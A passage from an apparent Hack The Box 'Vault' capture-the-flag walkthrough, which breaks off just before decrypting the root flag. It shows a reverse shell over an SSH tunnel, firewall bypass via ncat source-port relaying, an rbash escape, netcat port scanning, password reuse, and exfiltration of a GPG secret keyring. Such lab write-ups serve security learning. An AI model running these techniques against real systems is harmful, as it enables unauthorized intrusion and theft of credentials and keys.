</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>ssh <span class="nt">-R</span> 4444:127.0.0.1:4444 dave@10.10.10.109
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Click update file -&gt; Test VPN</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>root@TheCaretaker:~/HTB/Vault# rlwrap nc <span class="nt">-lnvp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>127.0.0.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>127.0.0.1] 35008
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1099<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
root@DNS:/var/www/html#
</pre></td></tr></tbody></table></code></pre></div></div>
<p>I get a file named ssh in dave’s folder with his password <code class="language-plaintext highlighter-rouge">dav3gerous567</code>.
Got shell with ssh:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>sshpass <span class="nt">-p</span> <span class="s1">'dav3gerous567'</span> ssh <span class="nt">-D</span> 1081 dave@192.168.122.4
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="netcat-port-scanner">Netcat port scanner</h2>
<p>I tried to scan <code class="language-plaintext highlighter-rouge">192.168.122.5</code> again with this <strong>bash port scanner</strong>. Got no ports.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> <span class="o">&gt;</span> port.sh <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh">
#!/bin/bash
nc -nvz 192.168.122.5 1-65535 2&gt;&amp;1 | grep -v refused
</span><span class="no">EOF
</span></pre></td></tr></tbody></table></code></pre></div></div>
<h2 id="bash_history-file-of-alex">.bash_history file of alex</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre>dave@DNS:/home/alex<span class="nv">$ </span><span class="nb">sudo cat</span> .bash_history
<span class="nb">sudo </span>apt <span class="nb">install </span>openssh-client
<span class="nb">sudo </span>apt <span class="nb">install </span>openssh-server
<span class="nb">sudo </span>apt <span class="nb">install </span>openvpn
<span class="nb">sudo </span>apt-get apache2
<span class="nb">sudo </span>apt <span class="nb">install </span>opache2
<span class="nb">sudo </span>apt <span class="nb">install </span>apache2
<span class="nb">sudo </span>apt-get <span class="nb">install </span>php libapache2-mod-php php-mcrypt php-mysql
<span class="nb">sudo </span>visudo
ping 192.168.1.11
<span class="nb">cd</span> /var/www
wget http://192.168.1.11:8888/DNS.zip
<span class="nb">sudo </span>nano /etc/network/interfaces
<span class="nb">cd</span> /var/www/html/
<span class="nb">cat </span>123.ovpn
ping 8.8.8.8
<span class="nb">sudo </span>apt-get nmap
apt-get <span class="nb">install </span>nmap
<span class="nb">sudo </span>su
<span class="nb">exit
cd</span> /etc/network
<span class="nb">rm </span>interfaces
<span class="nb">sudo </span>su
ping 192.168.5.2
su root
nc <span class="nt">-lvp</span> 8888
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This reveals a host as <code class="language-plaintext highlighter-rouge">192.168.1.11</code>, it also has a web-server at 8888 and <code class="language-plaintext highlighter-rouge">DNS.zip</code>.
But I cannot ping the host. Same with <code class="language-plaintext highlighter-rouge">192.168.5.2</code>
It also hints <code class="language-plaintext highlighter-rouge">/etc/network/interfaces</code> was changed.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="c"># This file describes the network interfaces available on your system</span>
<span class="c"># and how to activate them. For more information, see interfaces(5).</span>

<span class="nb">source</span> /etc/network/interfaces.d/<span class="k">*</span>

<span class="c"># The loopback network interface</span>
auto lo
iface lo inet loopback

<span class="c"># The primary network interface</span>
auto ens3
iface ens3 inet static
address 192.168.122.4
netmask 255.255.255.0
up route add <span class="nt">-net</span> 192.168.5.0 netmask 255.255.255.0 gw 192.168.122.5
up route add <span class="nt">-net</span> 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.28
</pre></td></tr></tbody></table></code></pre></div></div>

<p>So, I had the idea of adding another interface which I probably can’t do. We cannot just add interfaces on our own. I can surely configure one if it exists.
If there was another interface <code class="language-plaintext highlighter-rouge">ens4</code> let’s suppose which wasn’t configured. I could’ve edited  <code class="language-plaintext highlighter-rouge">/etc/network/interfaces</code> something like this:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="c"># This file describes the network interfaces available on your system</span>
<span class="c"># and how to activate them. For more information, see interfaces(5).</span>

<span class="nb">source</span> /etc/network/interfaces.d/<span class="k">*</span>

<span class="c"># The loopback network interface</span>
auto lo
iface lo inet loopback

<span class="c"># The primary network interface</span>
auto ens3
iface ens3 inet static
address 192.168.122.4
netmask 255.255.255.0
up route add <span class="nt">-net</span> 192.168.5.0 netmask 255.255.255.0 gw 192.168.122.5

auto ens4
iface ens4 inet static
address 192.168.1.4
netmask 255.255.255.0
up route add <span class="nt">-net</span> 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.28
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Since, no other interface exists other than <code class="language-plaintext highlighter-rouge">ens3</code>, I cannot configure any. Even if I configure <code class="language-plaintext highlighter-rouge">ens3</code> to that network, then I’ll be disconnected from the box as it no longer holds the address <code class="language-plaintext highlighter-rouge">192.168.122.4</code>.</p>
<h1 id="bypass-firewall-with-allowed-client-ports">Bypass firewall with allowed client ports</h1>
<p>If I check for</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre>root@DNS:/var# <span class="nb">grep</span> <span class="nt">-iraH</span> <span class="s1">'192.168.5.2'</span> <span class="nb">.</span>
./log/auth.log:Jul 17 16:49:01 DNS sshd[1912]: Accepted password <span class="k">for </span>dave from 192.168.5.2 port 4444 ssh2
./log/auth.log:Jul 17 16:49:02 DNS sshd[1943]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
./log/auth.log:Jul 17 16:49:02 DNS sshd[1943]: Disconnected from 192.168.5.2 port 4444
./log/auth.log:Jul 17 17:21:38 DNS sshd[1560]: Accepted password <span class="k">for </span>dave from 192.168.5.2 port 4444 ssh2
./log/auth.log:Jul 17 17:21:38 DNS sshd[1590]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
./log/auth.log:Jul 17 17:21:38 DNS sshd[1590]: Disconnected from 192.168.5.2 port 4444
./log/auth.log:Jul 17 21:58:26 DNS sshd[1171]: Accepted password <span class="k">for </span>dave from 192.168.5.2 port 4444 ssh2
./log/auth.log:Jul 17 21:58:29 DNS sshd[1249]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
./log/auth.log:Jul 17 21:58:29 DNS sshd[1249]: Disconnected from 192.168.5.2 port 4444
./log/auth.log:Jul 24 15:06:10 DNS sshd[1466]: Accepted password <span class="k">for </span>dave from 192.168.5.2 port 4444 ssh2
./log/auth.log:Jul 24 15:06:10 DNS sshd[1496]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
./log/auth.log:Jul 24 15:06:10 DNS sshd[1496]: Disconnected from 192.168.5.2 port 4444
./log/auth.log:Jul 24 15:06:26 DNS sshd[1500]: pam_unix<span class="o">(</span>sshd:auth<span class="o">)</span>: authentication failure<span class="p">;</span> <span class="nb">logname</span><span class="o">=</span> <span class="nv">uid</span><span class="o">=</span>0 <span class="nv">euid</span><span class="o">=</span>0 <span class="nb">tty</span><span class="o">=</span>ssh <span class="nv">ruser</span><span class="o">=</span> <span class="nv">rhost</span><span class="o">=</span>192.168.5.2  <span class="nv">user</span><span class="o">=</span>dave
./log/auth.log:Jul 24 15:06:28 DNS sshd[1500]: Failed password <span class="k">for </span>dave from 192.168.5.2 port 4444 ssh2
./log/auth.log:Jul 24 15:06:28 DNS sshd[1500]: Connection closed by 192.168.5.2 port 4444 <span class="o">[</span>preauth]
./log/auth.log:Jul 24 15:06:57 DNS sshd[1503]: Accepted password <span class="k">for </span>dave from 192.168.5.2 port 4444 ssh2
./log/auth.log:Jul 24 15:06:57 DNS sshd[1533]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
./log/auth.log:Jul 24 15:06:57 DNS sshd[1533]: Disconnected from 192.168.5.2 port 4444
./log/auth.log:Jul 24 15:07:21 DNS sshd[1536]: Accepted password <span class="k">for </span>dave from 192.168.5.2 port 4444 ssh2
./log/auth.log:Jul 24 15:07:21 DNS sshd[1566]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
./log/auth.log:Jul 24 15:07:21 DNS sshd[1566]: Disconnected from 192.168.5.2 port 4444
./log/auth.log:Sep  2 15:07:51 DNS <span class="nb">sudo</span>:     dave : <span class="nv">TTY</span><span class="o">=</span>pts/0 <span class="p">;</span> <span class="nv">PWD</span><span class="o">=</span>/home/dave <span class="p">;</span> <span class="nv">USER</span><span class="o">=</span>root <span class="p">;</span> <span class="nv">COMMAND</span><span class="o">=</span>/usr/bin/nmap 192.168.5.2 <span class="nt">-Pn</span> <span class="nt">--source-port</span><span class="o">=</span>4444 <span class="nt">-f</span>
./log/auth.log:Sep  2 15:10:20 DNS <span class="nb">sudo</span>:     dave : <span class="nv">TTY</span><span class="o">=</span>pts/0 <span class="p">;</span> <span class="nv">PWD</span><span class="o">=</span>/home/dave <span class="p">;</span> <span class="nv">USER</span><span class="o">=</span>root <span class="p">;</span> <span class="nv">COMMAND</span><span class="o">=</span>/usr/bin/ncat <span class="nt">-l</span> 1234 <span class="nt">--sh-exec</span> ncat 192.168.5.2 987 <span class="nt">-p</span> 53
./log/auth.log:Sep  2 15:10:34 DNS <span class="nb">sudo</span>:     dave : <span class="nv">TTY</span><span class="o">=</span>pts/0 <span class="p">;</span> <span class="nv">PWD</span><span class="o">=</span>/home/dave <span class="p">;</span> <span class="nv">USER</span><span class="o">=</span>root <span class="p">;</span> <span class="nv">COMMAND</span><span class="o">=</span>/usr/bin/ncat <span class="nt">-l</span> 3333 <span class="nt">--sh-exec</span> ncat 192.168.5.2 987 <span class="nt">-p</span> 53
N[z&lt;ssh:nottyalex192.168.122.1N[z&lt;ssh:nottyalex192.168.122.1N[zssh:nottydave192.168.122.1N[zssh:nottydave192.168.5.2d2W[ssh:nottydave192.168.122.17W[zssh:nottydave192.168.122.18W[zssh:nottydave192.168.122.18W[zssh:nottydave192.168.122.1%8W[z3tty1tty1dave3H9[<span class="nv">$3tty1tty1dave3T9</span><span class="o">[{</span>@3tty1tty1davetty1tty1davem9[ܧ]ssh:nottydave192.168.122.1@[zcssh:nottydave192.168.122.1T[z
</pre></td></tr></tbody></table></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">auth.log</code> contains a lot of login attempts from IPs. 
Let’s check what those IP’s are:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>root@DNS:/var/log# <span class="nb">grep</span> <span class="nt">-iraEo</span> <span class="s2">"[0-9]{1,3}</span><span class="se">\.</span><span class="s2">[0-9]{1,3}</span><span class="se">\.</span><span class="s2">[0-9]{1,3}</span><span class="se">\.</span><span class="s2">[0-9]{1,3}"</span> ./auth.log 2&gt;/dev/null | <span class="nb">sort</span> <span class="nt">-u</span>
0.0.0.0
192.168.122.1
192.168.5.2
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Also, <code class="language-plaintext highlighter-rouge">nmap</code> is installed on the box. 
Let’s scan <code class="language-plaintext highlighter-rouge">192.168.5.2</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>root@DNS:/var/log# nmap <span class="nt">-Pn</span> 192.168.5.2 <span class="nt">--reason</span> <span class="nt">-sVC</span>

Starting Nmap 7.01 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-07 20:39 BST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using <span class="nt">--system-dns</span> or specify valid servers with <span class="nt">--dns-servers</span>
Nmap scan report <span class="k">for </span>Vault <span class="o">(</span>192.168.5.2<span class="o">)</span>
Host is up, received user-set <span class="o">(</span>0.0016s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 filtered ports
Reason: 998 no-responses
PORT     STATE  SERVICE REASON       VERSION
53/tcp   closed domain  reset ttl 63
4444/tcp closed krb524  reset ttl 63
</pre></td></tr></tbody></table></code></pre></div></div>
<p>This <code class="language-plaintext highlighter-rouge">4444</code> port is the same port which is mentioned in <code class="language-plaintext highlighter-rouge">auth.log</code>. This port is for SSH.</p>

<p><code class="language-plaintext highlighter-rouge">auth.log</code> also mentions some commands that were run. One of them is this <code class="language-plaintext highlighter-rouge">nmap</code> command:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>root@DNS:/var/log# /usr/bin/nmap 192.168.5.2 <span class="nt">-Pn</span> <span class="nt">--source-port</span><span class="o">=</span>4444 <span class="nt">-f</span> <span class="nt">-sVC</span>

Starting Nmap 7.01 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-07 20:42 BST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using <span class="nt">--system-dns</span> or specify valid servers with <span class="nt">--dns-servers</span>
Nmap scan report <span class="k">for </span>Vault <span class="o">(</span>192.168.5.2<span class="o">)</span>
Host is up <span class="o">(</span>0.0020s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 999 closed ports
PORT    STATE SERVICE    VERSION
987/tcp open  tcpwrapped
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Same with the command <code class="language-plaintext highlighter-rouge">/usr/bin/nmap 192.168.5.2 -Pn --source-port=53</code>, which hints if there’s some firewall which only allows traffic from <code class="language-plaintext highlighter-rouge">53</code> and <code class="language-plaintext highlighter-rouge">4444</code>.</p>

<p>If I grab banner of port <code class="language-plaintext highlighter-rouge">987</code> with <code class="language-plaintext highlighter-rouge">nc</code> sending traffic from port <code class="language-plaintext highlighter-rouge">53</code> or <code class="language-plaintext highlighter-rouge">4444</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>root@DNS:/var/log# nc <span class="nt">-p</span> 53 192.168.5.2 987 <span class="nt">-v</span>
Connection to 192.168.5.2 987 port <span class="o">[</span>tcp/<span class="k">*</span><span class="o">]</span> succeeded!
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
</pre></td></tr></tbody></table></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">ssh</code> doesn’t come with an option to specify a source port.
<code class="language-plaintext highlighter-rouge">auth.log</code> gives some other commands with <code class="language-plaintext highlighter-rouge">ncat</code> :</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>/usr/bin/ncat <span class="nt">-l</span> 1234 <span class="nt">--sh-exec</span> ncat 192.168.5.2 987 <span class="nt">-p</span> 53
/usr/bin/ncat <span class="nt">-l</span> 3333 <span class="nt">--sh-exec</span> ncat 192.168.5.2 987 <span class="nt">-p</span> 53
</pre></td></tr></tbody></table></code></pre></div></div>

<p>In this command <code class="language-plaintext highlighter-rouge">ncat</code> opens a listener on <code class="language-plaintext highlighter-rouge">1234</code> and runs <code class="language-plaintext highlighter-rouge">ncat</code> on <code class="language-plaintext highlighter-rouge">--sh-exec</code> mode which allows to execute command with <code class="language-plaintext highlighter-rouge">/bin/sh</code>. Connects to <code class="language-plaintext highlighter-rouge">192.168.5.2</code>’s SSH port <code class="language-plaintext highlighter-rouge">987</code> through the client’s port <code class="language-plaintext highlighter-rouge">4444</code>. (I can use 53/4444 only)</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>dave@DNS:~<span class="nv">$ </span>ncat <span class="nt">-l</span> 1234 <span class="nt">--sh-exec</span> <span class="s2">"ncat 192.168.5.2 987 -p 4444"</span> &amp;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Then I can connect to localhost at port <code class="language-plaintext highlighter-rouge">1234</code> to get SSH login.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre>dave@DNS:~<span class="nv">$ </span>ssh localhost <span class="nt">-p</span> 1234
dave@localhost<span class="s1">'s password:
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

96 packages can be updated.
49 updates are security updates.


Last login: Mon Sep  3 16:48:00 2018
dave@vault:~$
</span></pre></td></tr></tbody></table></code></pre></div></div>
<p>And <code class="language-plaintext highlighter-rouge">dav3gerous567</code> as password works for dave at vault also.</p>

<h2 id="rbash">rbash</h2>
<p>Tab completions gives out errors due to <code class="language-plaintext highlighter-rouge">rbash</code> or restricted-bash shell.
You can get a <code class="language-plaintext highlighter-rouge">bash/sh</code> shell with <code class="language-plaintext highlighter-rouge">bash</code> or even <code class="language-plaintext highlighter-rouge">ssh -t bash</code> at the beginning itself.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>dave@vault:~<span class="nv">$ </span><span class="nt">-rbash</span>: /dev/null: restricted: cannot redirect output
bash: _upvars: <span class="sb">`</span><span class="nt">-a0</span><span class="s1">': invalid number specifier
-rbash: /dev/null: restricted: cannot redirect output
bash: _upvars: `-a0'</span>: invalid number specifier
<span class="nt">-rbash</span>: /dev/null: restricted: cannot redirect output
bash: _upvars: <span class="sb">`</span><span class="nt">-a0</span><span class="s1">': invalid number specifier
-rbash: /dev/null: restricted: cannot redirect output
bash: _upvars: `-a0'</span>: invalid number specifier

dave@vault:~<span class="nv">$ </span>bash
dave@vault:~<span class="nv">$ </span><span class="nb">ls 
</span>root.txt.gpg
</pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="roottxtgpg">root.txt.gpg</h1>
<p>If I check file-type:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>dave@vault:~<span class="nv">$ </span>file root.txt.gpg
root.txt.gpg: PGP RSA encrypted session key - keyid: 10C678C7 31FEBD1 RSA <span class="o">(</span>Encrypt or Sign<span class="o">)</span> 4096b <span class="nb">.</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I tried to decrypt it on the box itself as the key is stored in the local keyring <code class="language-plaintext highlighter-rouge">~/.gnupg</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>dave@vault:~<span class="nv">$ </span>gpg <span class="nt">-d</span> root.txt.gpg
gpg: encrypted with RSA key, ID D1EB1F03
gpg: decryption failed: secret key not available
</pre></td></tr></tbody></table></code></pre></div></div>
<p>But the key isn’t available.</p>

<p>To transfer this file, I can use <code class="language-plaintext highlighter-rouge">base32</code> as <code class="language-plaintext highlighter-rouge">base64</code> isn’t available.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>dave@vault:~<span class="nv">$ </span><span class="nb">base32 </span>root.txt.gpg  <span class="nt">-w0</span>
<span class="nv">QUBAYA6HPDDBBUPLD4BQCEAAUCMOVUY2GZXH4SL5RXIOQQYVMY4TAUFOZE64YFASXVITKTD56JHDLIHBLW3OQMKSHQDUTH3R6QKT3MUYPL32DYMUVFHTWRVO5Q3YLSY2R4K3RUOYE5YKCP2PAX7S7OJBGMJKKZNW6AVN6WGQNV5FISANQDCYJI656WFAQCIIHXCQCTJXBEBHNHGQIMTF4UAQZXICNPCRCT55AUMRZJEQ2KSYK7C3MIIH7Z7MTYOXRBOHHG2XMUDFPUTD5UXFYGCWKJVOGGBJK56OPHE25OKUQCRGVEVINLLC3PZEIAF6KSLVSOLKZ5DWWU34FH36HGPRFSWRIJPRGS4TJOQC3ZSWTXYPORPUFWEHEDOEOPWHH42565HTDUZ6DPJUIX243DQ45HFPLMYTTUW4UVGBWZ4IVV33LYYIB32QO3ONOHPN5HRCYYFECKYNUVSGMHZINOAPEIDO7RXRVBKMHASOS6WH5KOP2XIV4EGBJGM4E6ZSHXIWSG6EM6ODQHRWOAB3AGSLQ5ZHJBPDQ6LQ2PVUMJPWD2N32FSVCEAXP737LZ56TTDJNZN6J6OWZRTP6PBOERHXMQ3ZMYJIUWQF5GXGYOYAZ3MCF75KFJTQAU7D6FFWDBVQQJYQR6FNCH3M3Z5B4MXV7B3ZW4NX5UHZJ5STMCTDZY6SPTKQT6G5VTCG6UWOMK3RYKMPA2YTPKVWVNMTC62Q4E6CZWQAPBFU7NM652O2DROUUPLSHYDZ6SZSO72GCDMASI2X3NGDCGRTHQSD5NVYENRSEJBBCWAZTVO33IIRZ5RLTBVR7R4LKKIBZOVUSW36G37M6PD5EZABOBCHNOQL2HV27MMSK3TSQJ4462INFAB6OS7XCSMBONZZ26EZJTC5P42BGMXHE27464GCANQCRUWO5MEZEFU2KVDHUZRMJ6ABNAEEVIH4SS65JXTGKYLE7ED4C3UV66ALCMC767DKJTBKTTAX3UIRVNBQMYRI7XY</span><span class="o">=</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>file root.txt.gpg
root.txt.gpg: PGP RSA encrypted session key - keyid: C778C610 D1EB1F03 RSA <span class="o">(</span>Encrypt or Sign<span class="o">)</span> 4096b <span class="nb">.</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I tried cracking it with <code class="language-plaintext highlighter-rouge">john</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>gpg2john root.txt.gpg

File root.txt.gpg
        Encrypted data <span class="o">[</span>sym alg is specified <span class="k">in </span>pub-key encrypted session key]
SYM_ALG_MODE_PUB_ENC is not supported yet!
<span class="nv">$gpg$*</span>0<span class="k">*</span>99<span class="k">*</span>704476ba0bd1ebafb19256e728279cf690d2803e74bf71498173739d78994cc5d7f341332e726bfcf70c2036028d2ceeb0992169a55467a662c4f80168084aa0fc94bdd4de6656164f907c16e95f780b1305ff7c6a4cc2a9cc17dd111ab43066228fdf<span class="k">*</span>0<span class="k">*</span>18<span class="k">*</span>0<span class="k">*</span>0<span class="k">*</span>0<span class="k">*</span>0000000000000000
</pre></td></tr></tbody></table></code></pre></div></div>
<p>It didn’t crack.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>john <span class="nb">hash</span> <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
No password hashes loaded <span class="o">(</span>see FAQ<span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">dave@DNS</code> has an empty <code class="language-plaintext highlighter-rouge">secring.gpg</code>. Same with <code class="language-plaintext highlighter-rouge">dave@vault</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>dave@DNS:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> ~/.gnupg/secring.gpg
<span class="nt">-rw-------</span> 1 dave dave 0 Jul 17  2018 secring.gpg
</pre></td></tr></tbody></table></code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">root@DNS</code> doesn’t even have a <code class="language-plaintext highlighter-rouge">.gnupg</code> directory.</p>

<p><code class="language-plaintext highlighter-rouge">dave@ubuntu</code> does have a <code class="language-plaintext highlighter-rouge">secring.gpg</code> file.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>dave@ubuntu:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> ~/.gnupg/secring.gpg
<span class="nt">-rw-------</span> 1 dave dave 4879 Jul 24  2018 /home/dave/.gnupg/secring.gpg
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I transferred this keyring file to my box using base64.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>file secring.gpg
secring.gpg: PGP Secret Key - 4096b created on Tue Jul 24 19:51:47 2018 - RSA <span class="o">(</span>Encrypt or Sign<span class="o">)</span> <span class="nv">e</span><span class="o">=</span>65537 hashed AES with 128-bit key Salted&amp;Iterated S2K SHA-1
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="decrypt-gpg-with-secringgpg">Decrypt GPG with secring.gpg</h2>
<p>Listing all keys: (I don’t have any currently)</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>gpg <span class="nt">--list-keys</span>
gpg: /root/.gnupg/trustdb.gpg: trustdb created
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Importing <code class="language-plaintext highlighter-rouge">secring.gpg</code>. It asks for a password and we earlier got <code class="language-plaintext highlighter-rouge">itscominghome</code> as password from <code class="language-plaintext highlighter-rouge">dave@ubuntu:~/Desktop</code>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>gpg <span class="nt">--import</span> secring.gpg
gpg: key 9067DED00FDFBFE4: <span class="s2">"david &lt;dave@david.com&gt;"</span> not changed
gpg: key 9067DED00FDFBFE4: secret key imported
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys <span class="nb">read</span>: 1
gpg:  secret keys unchanged: 1
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Listing keys once again:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>gpg <span class="nt">--list-keys</span>
/root/.gnupg/pubring.kbx
<span class="nt">------------------------</span>
pub   rsa4096 2018-07-24 <span class="o">[</span>SC]
      DCB5262C10E1521B43D90F9B9067DED00FDFBFE4
uid           <span class="o">[</span> unknown] david &lt;dave@david.com&gt;
sub   rsa4096 2018-07-24 <span class="o">[</span>E]
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Decrypting encrypted root flag:</p>
